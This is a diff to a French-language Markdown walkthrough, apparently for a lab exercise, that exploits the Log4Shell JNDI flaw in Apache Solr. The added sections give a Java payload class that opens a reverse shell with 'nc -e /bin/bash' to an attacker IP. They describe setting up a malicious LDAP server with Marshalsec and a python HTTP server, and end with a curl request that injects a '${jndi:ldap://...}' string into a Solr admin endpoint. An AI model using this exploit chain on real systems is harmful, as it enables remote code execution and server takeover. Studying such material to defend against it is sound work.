@@ -48,4 +48,40 @@ Nous avons vu dans la partie précédente que l'application était vulnérable, 
 
 C'est ici que la seconde partie de la faille se trouve, l'utilisation de jdni va permettre de faire des appels à un serveur LDAP, serveur qui peut être malicieux et donc utilisé pour rediriger vers du code malveillant en notre possession.
 
+## Charge utile
+
+Afin de créer un accès au serveur, on cherche simplement à créer un shell, pour ça la classe Java suivante est suffisante : 
+
+
+```Java
+public class Exploit {
+    static {
+        try {
+            java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+    }
+}
+```
+
+On la compile sous le nom de `Exploit.class`
+
+## Mise en place d'un serveur LDAP malveillant
+
+Pour cela on utilise le software Marshalsec (https://github.com/mbechler/marshalsec) qui va permettre de créer le serveur et de rediriger le traffic.
+
+![image](https://user-images.githubusercontent.com/16634117/145871850-2f83e1d5-6e94-40ec-803b-c71be8fca4d6.png)
+
+## Attaque
+
+Une fois les éléments en place, il faut crér un serveur capacle de répondre avec notre charge malveillante, un simple `python3 -m http.server` fera l'affaire.
+
+Tous les éléments sont en place. 
+
+Une simple requête avec l'injection va permettre de déclencher toute la chaine d'attaque : 
+
+`curl 'http://10.10.31.65:8983/solr/admin/cores?foo=$\{jndi:ldap://10.10.65.176:1389/Exploit\}'`
+
+
 
